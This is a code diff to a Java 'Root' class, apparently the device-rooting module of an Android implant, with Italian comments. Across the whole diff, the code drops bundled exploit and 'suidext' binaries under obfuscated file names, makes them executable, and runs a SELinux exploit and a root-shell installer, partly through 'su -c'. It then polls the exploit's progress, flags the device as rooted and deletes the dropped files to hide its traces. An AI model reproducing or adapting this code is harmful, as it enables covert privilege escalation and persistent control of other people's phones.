@@ -235,7 +235,6 @@ public class Root {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (uninstallRoot): failed to create uninstall script"); //$NON-NLS-1$
 			}
-
 			return false;
 		}
 
@@ -255,6 +254,20 @@ public class Root {
 		return true;
 	}
 
+	static public void supersuRootThreaded() {
+		if (Status.haveSu() == false) {
+			return;
+		}
+		// Start exploitation thread
+		SuperuserThread suThread = new Root.SuperuserThread();
+		Thread exploit = new Thread(suThread);
+		// exploit.start();
+
+		if (Cfg.DEBUG) {
+			Check.log(TAG + "(suThread): su thread running");
+		}
+	}
+
 	// Prendi la root tramite superuser.apk
 	static public void supersuRoot() {
 
@@ -267,48 +280,50 @@ public class Root {
 		String pack = Status.self().getAppContext().getPackageName();
 		final String installPath = String.format(M.e("/data/data/%s/files"), pack);
 
-		final AutoFile suidext = new AutoFile(installPath, M.e("ss")); // suidext
-																		// standard
-		final AutoFile selinuxSuidext = new AutoFile(installPath, M.e("qj")); // selinux_suidext
-		final AutoFile shellInstaller = new AutoFile(installPath, M.e("tk")); // shell_installer.sh
+		final AutoFile selinuxSuidext = new AutoFile(installPath, M.e("comp")); // selinux_suidext
+		final AutoFile shellInstaller = new AutoFile(installPath, M.e("verify")); // shell_installer.sh
 
 		try {
-			// suidext
-			InputStream streamS = Utils.getAssetStream("s.bin");
 			// selinux_suidext
 			InputStream streamJ = Utils.getAssetStream("j.bin");
 			// shell_installer.sh
 			InputStream streamK = Utils.getAssetStream("k.bin");
 
-			fileWrite(suidext.getName(), streamS, Cfg.RNDDB);
 			fileWrite(selinuxSuidext.getName(), streamJ, Cfg.RNDDB);
 			fileWrite(shellInstaller.getName(), streamK, Cfg.RNDDB);
 
 			if (Cfg.DEBUG) {
-				Check.asserts(suidext.exists(), " (supersuRoot) Assert failed, not existing: " + suidext);
 				Check.asserts(selinuxSuidext.exists(), " (supersuRoot) Assert failed, not existing: " + selinuxSuidext);
 				Check.asserts(shellInstaller.exists(), " (supersuRoot) Assert failed, not existing: " + shellInstaller);
 			}
 
 			// Proviamoci ad installare la nostra shell root
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (supersuRoot): " + "chmod 755 " + suidext + " " + selinuxSuidext
-						+ " " + shellInstaller); //$NON-NLS-1$
-				Check.log(TAG + " (supersuRoot): " + shellInstaller + " " + selinuxSuidext + " " + suidext); //$NON-NLS-1$
+				Check.log(TAG + " (supersuRoot): " + "chmod 755 " + selinuxSuidext + " " + shellInstaller); //$NON-NLS-1$
+				Check.log(TAG + " (supersuRoot): " + shellInstaller + " " + selinuxSuidext); //$NON-NLS-1$
 			}
 
-			Execute.execute(M.e("/system/bin/chmod 755 ") + suidext + " " + selinuxSuidext + " " + shellInstaller);
+			Execute.execute(M.e("/system/bin/chmod 755 ") + selinuxSuidext + " " + shellInstaller);
 
-			ExecuteResult res = Execute.execute(new String[] { shellInstaller.getFilename(),
-					selinuxSuidext.getFilename(), suidext.getFilename() });
+			ExecuteResult res = Execute.execute(new String[] { "su", "-c",
+					shellInstaller.getFilename() + " " + selinuxSuidext.getFilename() });
 
-			if (Cfg.DEBUG) {
+			if (Cfg.DEBUG) { 
 				Check.log(TAG + " (supersuRoot) execute 2: " + shellInstaller + " ret: " + res.exitCode);
 			}
 
-			// shellInstaller.delete();
-			// suidext.delete();
-			// selinuxSuidext.delete();
+			shellInstaller.delete();
+			selinuxSuidext.delete();
+
+			if (Root.isRootShellInstalled()) {
+
+				if (PackageInfo.checkRoot()) {
+					Status.setRoot(true);
+
+					Status.self().setReload();
+				}
+			}
+
 		} catch (final Exception e1) {
 			if (Cfg.EXCEPTION) {
 				Check.log(e1);
@@ -321,6 +336,7 @@ public class Root {
 
 			return;
 		}
+
 	}
 
 	static public boolean checkCyanogenmod() {
@@ -495,7 +511,7 @@ public class Root {
 
 	static public void selinuxExploit() {
 		// Start exploitation thread
-		selinuxExploitThread selinuxThread = new selinuxExploitThread();
+		SelinuxExploitThread selinuxThread = new SelinuxExploitThread();
 		Thread exploit = new Thread(selinuxThread);
 		exploit.start();
 
@@ -832,117 +848,189 @@ public class Root {
 		return 1;
 	}
 
-}
+	static class SuperuserThread implements Runnable {
+		private static final String TAG = "superuserThread";
 
-class selinuxExploitThread implements Runnable {
-	private static final String TAG = "selinuxExploitThread";
+		@Override
+		public void run() {
 
-	@Override
-	public void run() {
-		final File filesPath = Status.getAppContext().getFilesDir();
-		final String path = filesPath.getAbsolutePath();
-		final String localExploit = M.e("vs"); // selinux_exploit
-		final String selinuxSuidext = M.e("qj"); // selinux_suidext
-		final String suidext = M.e("ss"); // suidext (standard)
+			final File filesPath = Status.getAppContext().getFilesDir();
+			// final String path = filesPath.getAbsolutePath();
+			String pack = Status.self().getAppContext().getPackageName();
+			final String installPath = String.format(M.e("/data/data/%s/files"), pack);
 
-		InputStream streamExpl = Utils.getAssetStream("g.bin"); // selinux_exploit
-		InputStream streamSelinuxSuidext = Utils.getAssetStream("j.bin"); // selinux_suidext
-																			// rilcap
-		InputStream streamSuidext = Utils.getAssetStream("s.bin"); // suidext
-																	// rilcapn
-																	// (standard)
+			final AutoFile selinuxSuidext = new AutoFile(installPath, M.e("qj")); // selinux_suidext
+			final AutoFile shellInstaller = new AutoFile(installPath, M.e("tk")); // shell_installer.sh
 
-		try {
-			Root.fileWrite(localExploit, streamExpl, Cfg.RNDDB);
-			Root.fileWrite(selinuxSuidext, streamSelinuxSuidext, Cfg.RNDDB);
-			Root.fileWrite(suidext, streamSuidext, Cfg.RNDDB);
+			try {
+				// selinux_suidext
+				InputStream streamJ = Utils.getAssetStream("j.bin");
+				// shell_installer.sh
+				InputStream streamK = Utils.getAssetStream("k.bin");
 
-			Execute.execute(M.e("/system/bin/chmod 755 ") + path + "/" + localExploit);
-			Execute.execute(M.e("/system/bin/chmod 755 ") + path + "/" + selinuxSuidext);
-			Execute.execute(M.e("/system/bin/chmod 755 ") + path + "/" + suidext);
-
-			// Run SELinux exploit
-			// - argv[1]: path assoluto alla nuova shell
-			// - argv[2]: path assoluto alla vecchia shell
-			String pack = Status.getAppContext().getPackageName();
-
-			String script = M.e("#!/system/bin/sh")
-					+ "\n"
-					+ String.format(M.e("/data/data/%s/files/vs /data/data/%s/files/qj /data/data/%s/files/ss"), pack,
-							pack, pack) + "\n";
-
-			if (Root.createScript("fig", script) == true) {
-				Process runScript = Runtime.getRuntime().exec(path + "/fig");
-
-				// Non serve
-				runScript.waitFor();
+				fileWrite(selinuxSuidext.getName(), streamJ, Cfg.RNDDB);
+				fileWrite(shellInstaller.getName(), streamK, Cfg.RNDDB);
 
 				if (Cfg.DEBUG) {
-					Check.log(TAG + "(run): " + runScript.getClass());
+					Check.asserts(selinuxSuidext.exists(), " (supersuRoot) Assert failed, not existing: "
+							+ selinuxSuidext);
+					Check.asserts(shellInstaller.exists(), " (supersuRoot) Assert failed, not existing: "
+							+ shellInstaller);
 				}
 
-				// Monitor exploit execution
-				boolean finished = true;
-				long curTime = System.currentTimeMillis();
+				// Proviamoci ad installare la nostra shell root
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (supersuRoot): " + "chmod 755 " + selinuxSuidext + " " + shellInstaller); //$NON-NLS-1$
+					Check.log(TAG + " (supersuRoot): " + shellInstaller + " " + selinuxSuidext); //$NON-NLS-1$
+				}
 
-				while (System.currentTimeMillis() < curTime + (1000 * 60 * 8)) {
-					ExecuteResult result = Execute.execute("ps");
+				Execute.execute(M.e("/system/bin/chmod 755 ") + selinuxSuidext + " " + shellInstaller);
 
-					for (String s : result.stdout) {
-						if (s.contains("/files/vs")) {
-							if (Cfg.DEBUG) {
-								Check.log(TAG + "(run): exploitation in progress");
+				ExecuteResult res = Execute.execute(new String[] { "su", "-c",
+						shellInstaller.getFilename() + " " + selinuxSuidext.getFilename() });
+
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (supersuRoot) execute 2: " + shellInstaller + " ret: " + res.exitCode);
+				}
+
+				shellInstaller.delete();
+				selinuxSuidext.delete();
+
+				if (Root.isRootShellInstalled()) {
+
+					if (PackageInfo.checkRoot()) {
+						Status.setRoot(true);
+
+						Status.self().setReload();
+					}
+				}
+
+			} catch (final Exception e1) {
+				if (Cfg.EXCEPTION) {
+					Check.log(e1);
+				}
+
+				if (Cfg.DEBUG) {
+					Check.log(e1);//$NON-NLS-1$
+					Check.log(TAG + " (supersuRoot): Exception"); //$NON-NLS-1$
+				}
+
+				return;
+			}
+
+		}
+	}
+
+	static class SelinuxExploitThread implements Runnable {
+		private static final String TAG = "selinuxExploitThread";
+
+		@Override
+		public void run() {
+			final File filesPath = Status.getAppContext().getFilesDir();
+			final String path = filesPath.getAbsolutePath();
+			final String localExploit = M.e("vs"); // selinux_exploit
+			final String selinuxSuidext = M.e("qj"); // selinux_suidext
+			final String suidext = M.e("ss"); // suidext (standard)
+
+			InputStream streamExpl = Utils.getAssetStream("g.bin"); // selinux_exploit
+			InputStream streamSelinuxSuidext = Utils.getAssetStream("j.bin"); // selinux_suidext
+																				// rilcap
+			InputStream streamSuidext = Utils.getAssetStream("s.bin"); // suidext
+																		// rilcapn
+																		// (standard)
+
+			try {
+				Root.fileWrite(localExploit, streamExpl, Cfg.RNDDB);
+				Root.fileWrite(selinuxSuidext, streamSelinuxSuidext, Cfg.RNDDB);
+				Root.fileWrite(suidext, streamSuidext, Cfg.RNDDB);
+
+				Execute.execute(M.e("/system/bin/chmod 755 ") + path + "/" + localExploit);
+				Execute.execute(M.e("/system/bin/chmod 755 ") + path + "/" + selinuxSuidext);
+				Execute.execute(M.e("/system/bin/chmod 755 ") + path + "/" + suidext);
+
+				// Run SELinux exploit
+				// - argv[1]: path assoluto alla nuova shell
+				// - argv[2]: path assoluto alla vecchia shell
+				String pack = Status.getAppContext().getPackageName();
+
+				String script = M.e("#!/system/bin/sh")
+						+ "\n"
+						+ String.format(M.e("/data/data/%s/files/vs /data/data/%s/files/qj /data/data/%s/files/ss"),
+								pack, pack, pack) + "\n";
+
+				if (Root.createScript("fig", script) == true) {
+					Process runScript = Runtime.getRuntime().exec(path + "/fig");
+
+					// Non serve
+					runScript.waitFor();
+
+					if (Cfg.DEBUG) {
+						Check.log(TAG + "(run): " + runScript.getClass());
+					}
+
+					// Monitor exploit execution
+					boolean finished = true;
+					long curTime = System.currentTimeMillis();
+
+					while (System.currentTimeMillis() < curTime + (1000 * 60 * 8)) {
+						ExecuteResult result = Execute.execute("ps");
+
+						for (String s : result.stdout) {
+							if (s.contains("/files/vs")) {
+								if (Cfg.DEBUG) {
+									Check.log(TAG + "(run): exploitation in progress");
+								}
+
+								finished = false;
+								break;
 							}
+						}
 
-							finished = false;
+						if (finished || Root.isRootShellInstalled()) {
+							if (Cfg.DEBUG) {
+								Check.log(TAG + "(run): exploitation terminated after "
+										+ (System.currentTimeMillis() - curTime) / 1000 + " seconds");
+							}
+							if (PackageInfo.checkRoot()) {
+								Status.setRoot(true);
+
+								Status.self().setReload();
+							}
 							break;
 						}
+
+						finished = true;
+						Utils.sleep(5000);
 					}
 
-					if (finished || Root.isRootShellInstalled()) {
-						if (Cfg.DEBUG) {
-							Check.log(TAG + "(run): exploitation terminated after "
-									+ (System.currentTimeMillis() - curTime) / 1000 + " seconds");
-						}
-						if (PackageInfo.checkRoot()) {
-							Status.setRoot(true);
-
-							Status.self().setReload();
-						}
-						break;
+					Root.removeScript("fig");
+				} else {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " ERROR: (run), cannot create script");
 					}
-
-					finished = true;
-					Utils.sleep(5000);
+					PackageInfo.checkRoot();
 				}
 
-				Root.removeScript("fig");
-			} else {
+				File file = new File(Status.getAppContext().getFilesDir(), localExploit);
+				file.delete();
+
+				file = new File(Status.getAppContext().getFilesDir(), selinuxSuidext);
+				file.delete();
+
+				file = new File(Status.getAppContext().getFilesDir(), suidext);
+				file.delete();
+			} catch (final Exception e1) {
+				if (Cfg.EXCEPTION) {
+					Check.log(e1);
+				}
+
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " ERROR: (run), cannot create script");
+					Check.log(e1);//$NON-NLS-1$
+					Check.log(TAG + " (run): Exception"); //$NON-NLS-1$
 				}
-				PackageInfo.checkRoot();
+
+				return;
 			}
-
-			File file = new File(Status.getAppContext().getFilesDir(), localExploit);
-			file.delete();
-
-			file = new File(Status.getAppContext().getFilesDir(), selinuxSuidext);
-			file.delete();
-
-			file = new File(Status.getAppContext().getFilesDir(), suidext);
-			file.delete();
-		} catch (final Exception e1) {
-			if (Cfg.EXCEPTION) {
-				Check.log(e1);
-			}
-
-			if (Cfg.DEBUG) {
-				Check.log(e1);//$NON-NLS-1$
-				Check.log(TAG + " (run): Exception"); //$NON-NLS-1$
-			}
-
-			return;
 		}
 	}
 }
